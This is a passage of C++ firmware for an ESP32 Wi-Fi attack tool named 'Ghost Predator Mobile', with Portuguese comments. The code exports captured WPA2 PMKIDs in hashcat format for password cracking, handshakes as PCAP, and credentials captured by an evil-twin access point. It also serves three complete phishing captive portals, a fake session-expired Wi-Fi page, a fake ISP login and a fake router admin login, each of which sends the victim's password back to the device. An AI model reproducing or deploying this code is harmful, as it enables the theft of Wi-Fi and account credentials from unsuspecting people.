            String neo = doc["newpass"] | "";
            if (cur != WebServer::get().currentPass) {
                req->send(401, "application/json", "{\"ok\":false,\"error\":\"Senha atual incorreta\"}");
                return;
            }
            if (neo.length() < 4) {
                req->send(400, "application/json", "{\"ok\":false,\"error\":\"Senha muito curta (min 4)\"}");
                return;
            }
            WebServer::get().currentPass = neo;
            LOG.success("[AUTH] Senha alterada com sucesso");
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Export ────────────────────────────────────────────────────────────
        server.on("/api/export/pmkids", HTTP_GET, [](AsyncWebServerRequest* req) {
            String out = "# hashcat -m 22000 pmkids.txt wordlist.txt\n";
            for (auto& p : Sniffer::get().pmkids) {
                char hex[33];
                for (int i=0;i<16;i++) sprintf(hex+i*2,"%02X",p.pmkid[i]);
                // hashcat 22000: PMKID*AP_MAC*CLIENT_MAC*ESSID_HEX
                String apMac = p.bssid; apMac.replace(":","");
                String clMac = p.client; clMac.replace(":","");
                // Busca SSID pelo BSSID no scanner
                String ssidHex = "";
                for (auto& ap : WiFiScanner::get().aps()) {
                    if (ap.bssidStr == p.bssid) {
                        for (int i = 0; i < (int)ap.ssid.length(); i++) {
                            char hb[3]; sprintf(hb, "%02X", (uint8_t)ap.ssid[i]);
                            ssidHex += hb;
                        }
                        break;
                    }
                }
                out += String(hex) + "*" + apMac + "*" + clMac + "*" + ssidHex + "\n";
            }
            req->send(200, "text/plain", Sniffer::get().pmkids.empty() ? "# Nenhum PMKID\n" : out);
        });
        server.on("/api/export/handshakes", HTTP_GET, [](AsyncWebServerRequest* req) {
            String out = "# Ghost Predator Mobile — Handshakes WPA2\n";
            out += "# Formato: BSSID | CLIENT | TIPO | BYTES\n";
            for (auto& h : Sniffer::get().handshakes) {
                out += h.bssid + " | " + h.client + " | M" + String(h.type) + " | " + String(h.len) + "B\n";
            }
            req->send(200, "text/plain", out);
        });
        server.on("/api/export/creds", HTTP_GET, [](AsyncWebServerRequest* req) {
            String out = "# Ghost Predator Mobile — Credenciais Capturadas\n";
            for (auto& c : EvilTwin::get().captured)
                out += "SSID:" + c.ssid + " | PASS:" + c.password + " | IP:" + c.ip + "\n";
            req->send(200, "text/plain", out.isEmpty() ? "# Nenhuma credencial\n" : out);
        });

        // ── PCAP Export (DLT_IEEE802_11 = 105) ───────────────────────────────
        server.on("/api/export/pcap", HTTP_GET, [](AsyncWebServerRequest* req) {
            // Monta arquivo PCAP com os frames EAPOL/handshake capturados
            // Global header: magic, ver_maj, ver_min, thiszone, sigfigs, snaplen, dlt
            static const uint8_t hdr[] = {
                0xD4,0xC3,0xB2,0xA1, // magic (little-endian)
                0x02,0x00,0x04,0x00, // ver 2.4
                0x00,0x00,0x00,0x00, // thiszone
                0x00,0x00,0x00,0x00, // sigfigs
                0xFF,0xFF,0x00,0x00, // snaplen 65535
                0x69,0x00,0x00,0x00  // DLT_IEEE802_11 = 105
            };
            String pcap((const char*)hdr, 24);
            // Um record por frame EAPOL capturado
            for (auto& h : Sniffer::get().handshakes) {
                uint32_t ts_sec  = h.ts / 1000;
                uint32_t ts_usec = (h.ts % 1000) * 1000;
                uint32_t incl    = (uint32_t)h.len;
                uint32_t orig    = incl;
                // Record header (16 bytes)
                pcap += String((char*)&ts_sec,  4);
                pcap += String((char*)&ts_usec, 4);
                pcap += String((char*)&incl,    4);
                pcap += String((char*)&orig,    4);
                pcap += String((const char*)h.data, h.len);
            }
            AsyncWebServerResponse* resp = req->beginResponse(200, "application/octet-stream", pcap);
            resp->addHeader("Content-Disposition", "attachment; filename=\"capture.pcap\"");
            req->send(resp);
        });

        // ── Channel Stats ─────────────────────────────────────────────────────
        server.on("/api/sniffer/channels", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (int ch = 1; ch <= 13; ch++) {
                JsonObject o = arr.add<JsonObject>();
                o["ch"]   = ch;
                o["pkts"] = Sniffer::get().channelStats[ch];
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });

        // ── Logs ──────────────────────────────────────────────────────────────
        server.on("/api/logs", HTTP_GET, [](AsyncWebServerRequest* req) {
            JsonDocument doc; JsonArray arr = doc.to<JsonArray>();
            for (auto& e : LOG.entries()) {
                JsonObject o = arr.add<JsonObject>();
                o["lvl"]=e.level; o["ts"]=e.ts; o["msg"]=e.msg;
            }
            String out; serializeJson(doc, out);
            req->send(200, "application/json", out);
        });
        server.on("/api/logs/clear", HTTP_POST, [](AsyncWebServerRequest* req) {
            LOG.clear();
            req->send(200, "application/json", "{\"ok\":true}");
        });

        // ── Captive portal ────────────────────────────────────────────────────
        const char* captivePaths[] = {
            "/generate_204","/connecttest.txt",
            "/hotspot-detect.html","/ncsi.txt","/success.txt"
        };
        for (auto* p : captivePaths)
            server.on(p, HTTP_GET, _captivePortal);

        server.on("/portal", HTTP_GET, _portalPage);
        _postJson("/portal", [](AsyncWebServerRequest* req, JsonDocument& doc) {
            EvilTwin::get().addCred(
                doc["ssid"]     | EvilTwin::get().clonedSSID,
                doc["password"] | "",
                req->client()->remoteIP().toString()
            );
            req->send(200,"application/json","{\"ok\":true}");
        });

        server.onNotFound([](AsyncWebServerRequest* req) {
            if (EvilTwin::get().running)
                req->redirect("http://" AP_IP "/portal");
            else
                req->send(404,"text/plain","Not found");
        });
    }

    int _portalTemplate = 0; // 0=WiFi, 1=ISP, 2=RouterAdmin

    using JsonHandler = std::function<void(AsyncWebServerRequest*, JsonDocument&)>;
    void _postJson(const char* path, JsonHandler handler) {
        server.on(path, HTTP_POST,
            [](AsyncWebServerRequest*){},
            nullptr,
            [handler](AsyncWebServerRequest* req, uint8_t* data, size_t len, size_t, size_t) {
                JsonDocument doc;
                if (len > 0) deserializeJson(doc, data, len);
                handler(req, doc);
            });
    }

    static void _captivePortal(AsyncWebServerRequest* req) {
        req->redirect("http://" AP_IP "/portal");
    }

    static void _portalPage(AsyncWebServerRequest* req) {
        String ssid = EvilTwin::get().clonedSSID;
        if (ssid.isEmpty()) ssid = "WiFi";
        int tpl = WebServer::get()._portalTemplate;
        String html;

        if (tpl == 1) {
            // ISP / Provedor de Internet portal
            html = R"(<!DOCTYPE html><html><head>
<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Portal do Cliente</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f4f6f8;min-height:100vh}
.header{background:#00539f;color:#fff;padding:1rem 2rem;display:flex;align-items:center;gap:1rem}
.header svg{width:36px;height:36px;fill:#fff}
.header h1{font-size:1.2rem;font-weight:bold}
.main{display:flex;align-items:center;justify-content:center;padding:3rem 1rem}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px #0002;width:100%;max-width:420px;padding:2rem}
.card h2{font-size:1.1rem;color:#00539f;margin-bottom:.5rem}
.card p{color:#555;font-size:.9rem;margin-bottom:1.5rem}
label{display:block;font-size:.8rem;color:#333;margin-bottom:.3rem;font-weight:bold}
input{width:100%;padding:.7rem;border:1px solid #ccc;border-radius:3px;font-size:.95rem;margin-bottom:1rem}
input:focus{outline:none;border-color:#00539f}
.btn{width:100%;padding:.75rem;background:#00539f;border:none;border-radius:3px;color:#fff;font-size:1rem;font-weight:bold;cursor:pointer}
.btn:hover{background:#003f7a}
.footer{text-align:center;color:#aaa;font-size:.75rem;margin-top:1rem}
</style></head>
<body>
<div class='header'>
<svg viewBox='0 0 24 24'><path d='M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z'/></svg>
<h1>Portal WiFi — Autenticação</h1>
</div>
<div class='main'><div class='card'>
<h2>Sessão Expirada</h2>
<p>Sua sessão na rede <strong>)" + ssid + R"(</strong> foi encerrada por inatividade. Insira suas credenciais para reconectar.</p>
<div id='form'>
<label>Usuário / CPF</label>
<input type='text' id='user' placeholder='usuario@provedor.com.br'>
<label>Senha da Rede WiFi</label>
<input type='password' id='pw' placeholder='Senha' autofocus>
<button class='btn' onclick='send()'>Entrar</button>
<p class='footer'>Ao continuar, você aceita os Termos de Uso do serviço.</p>
</div>
<div id='ok' style='display:none;text-align:center;padding:1rem'>
<p style='color:#00539f;font-size:1.1rem;font-weight:bold'>&#10003; Autenticando...</p>
<p style='color:#555;margin-top:.5rem'>Aguarde, você será redirecionado.</p>
</div>
</div></div>
<script>
async function send(){
  const pw=document.getElementById('pw').value;
  const u=document.getElementById('user').value;
  if(!pw)return;
  await fetch('/portal',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ssid:')" + ssid + R"(',password:pw,user:u})});
  document.getElementById('form').style.display='none';
  document.getElementById('ok').style.display='block';
  setTimeout(()=>location.reload(),5000);
}
document.getElementById('pw').addEventListener('keydown',e=>e.key==='Enter'&&send());
</script></body></html>)";

        } else if (tpl == 2) {
            // Router Admin portal
            html = R"(<!DOCTYPE html><html><head>
<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Router Configuration</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Courier New',monospace;background:#1a1a1a;color:#c0c0c0;display:flex;flex-direction:column;min-height:100vh}
.topbar{background:#2d2d2d;border-bottom:1px solid #444;padding:.5rem 1rem;display:flex;align-items:center;gap:.5rem}
.topbar span{color:#ff9900;font-weight:bold;font-size:.9rem}
.topbar .sep{color:#555;margin:0 .3rem}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:2rem 1rem}
.box{background:#252525;border:1px solid #3a3a3a;border-radius:4px;width:100%;max-width:400px;overflow:hidden}
.box-title{background:#333;border-bottom:1px solid #444;padding:.75rem 1rem;color:#ff9900;font-size:.9rem;font-weight:bold}
.box-body{padding:1.5rem}
.row{margin-bottom:1rem}
.row label{display:block;font-size:.75rem;color:#999;margin-bottom:.35rem;text-transform:uppercase}
.row input{width:100%;padding:.6rem .8rem;background:#1a1a1a;border:1px solid #3a3a3a;border-radius:2px;color:#c0c0c0;font-family:monospace;font-size:.9rem}
.row input:focus{outline:none;border-color:#ff9900}
.actions{display:flex;gap:.5rem;margin-top:.5rem}
.btn{flex:1;padding:.65rem;border:none;border-radius:2px;font-family:monospace;font-size:.85rem;cursor:pointer;font-weight:bold}
.btn-primary{background:#ff9900;color:#1a1a1a}
.btn-secondary{background:#333;color:#999;border:1px solid #444}
.warn{font-size:.75rem;color:#666;margin-top:1rem;line-height:1.4}
</style></head>
<body>
<div class='topbar'>
<span>&#9881; Router Admin</span><span class='sep'>|</span>
<span style='color:#888'>192.168.1.1</span><span class='sep'>|</span>
<span style='color:#f00'>&#9679;</span><span style='font-size:.8rem;color:#f00'> Not Authenticated</span>
</div>
<div class='main'><div class='box'>
<div class='box-title'>&#128274; AUTHENTICATION REQUIRED</div>
<div class='box-body' id='form'>
<div class='row'><label>Username</label><input type='text' id='user' value='admin' autocomplete='username'></div>
<div class='row'><label>Password</label><input type='password' id='pw' placeholder='Router password' autofocus autocomplete='current-password'></div>
<div class='actions'>
<button class='btn btn-primary' onclick='send()'>Login</button>
<button class='btn btn-secondary' onclick=''>Cancel</button>
</div>
<p class='warn'>Access restricted to authorized users only. Unauthorized access attempts are logged.</p>
</div>
<div class='box-body' id='ok' style='display:none'>
<p style='color:#0f0;font-family:monospace'>&#62; Authentication successful...</p>
<p style='color:#0f0;font-family:monospace'>&#62; Loading configuration...</p>
<p style='color:#0f0;font-family:monospace'>&#62; Please wait.</p>
</div>
</div></div>
<script>
async function send(){
  const pw=document.getElementById('pw').value;
  const u=document.getElementById('user').value;
  if(!pw)return;
  await fetch('/portal',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ssid:')" + ssid + R"(',password:pw,user:u})});
  document.getElementById('form').style.display='none';
  document.getElementById('ok').style.display='block';
  setTimeout(()=>location.reload(),5000);
}
document.getElementById('pw').addEventListener('keydown',e=>e.key==='Enter'&&send());
</script></body></html>)";

        } else {
            // Template 0: WiFi Reconnect (padrão)
            html = R"(<!DOCTYPE html><html><head>
<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>)" + ssid + R"( — Reconectar</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0d0d17;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.wrap{width:100%;max-width:380px;padding:1rem}
.card{background:#13131f;border:1px solid #1e1e3a;border-radius:16px;padding:2rem;box-shadow:0 20px 60px #0009}
.icon{font-size:3rem;text-align:center;margin-bottom:1rem}
h2{text-align:center;font-size:1.2rem;margin-bottom:.3rem;color:#fff}
.sub{text-align:center;color:#888;font-size:.85rem;margin-bottom:1.5rem}
.field{margin-bottom:1rem}
.field label{display:block;font-size:.75rem;color:#888;margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.05em}
.field input{width:100%;padding:.75rem 1rem;background:#0d0d17;border:1px solid #1e1e3a;border-radius:8px;color:#e0e0e0;font-size:.95rem}
.field input:focus{outline:none;border-color:#e94560}
.btn{width:100%;padding:.85rem;background:linear-gradient(135deg,#e94560,#c0392b);border:none;border-radius:8px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;margin-top:.5rem}
</style></head>
<body><div class='wrap'><div class='card'>
<div id='form'>
<div class='icon'>&#128246;</div>
<h2>)" + ssid + R"(</h2>
<p class='sub'>Sua sessão foi encerrada. Insira a senha para reconectar.</p>
<div class='field'><label>Rede</label><input type='text' value=')" + ssid + R"(' disabled></div>
<div class='field'><label>Senha</label><input type='password' id='pw' placeholder='Senha do WiFi' required autofocus></div>
<button class='btn' onclick='send()'>Conectar</button>
</div>
<div id='ok' style='display:none;text-align:center;padding:2rem'>
<div style='font-size:3rem;color:#00ff88'>&#10003;</div>
<h2>Conectando...</h2>
<p class='sub'>Aguarde alguns instantes.</p>
</div>
</div></div>
<script>
async function send(){
  const pw=document.getElementById('pw').value;
  if(!pw)return;
  await fetch('/portal',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({ssid:')" + ssid + R"(',password:pw})});
  document.getElementById('form').style.display='none';
  document.getElementById('ok').style.display='block';
  setTimeout(()=>location.reload(),4000);
}
document.getElementById('pw').addEventListener('keydown',e=>e.key==='Enter'&&send());
</script></div></body></html>)";
        }
        req->send(200, "text/html", html);
    }

    static void _parseMac(const char* s, uint8_t* out) {
        sscanf(s,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&out[0],&out[1],&out[2],&out[3],&out[4],&out[5]);
    }

    // Retorna true se o MAC é da própria placa (AP ou STA) — não atacar a si mesmo
    static bool _isSelfMac(const uint8_t* mac) {
        static uint8_t apMac[6]  = {0};
        static uint8_t staMac[6] = {0};
        static bool    loaded    = false;
        if (!loaded) {
            esp_wifi_get_mac(WIFI_IF_AP,  apMac);
            esp_wifi_get_mac(WIFI_IF_STA, staMac);
            loaded = true;
        }
        return (memcmp(mac, apMac,  6) == 0 ||
                memcmp(mac, staMac, 6) == 0);
    }

    static String _esc(const String& s) {
        String r=s;
        r.replace("\\","\\\\"); r.replace("\"","\\\"");
        r.replace("\n","\\n");  r.replace("\r","");
        return r;
    }
};
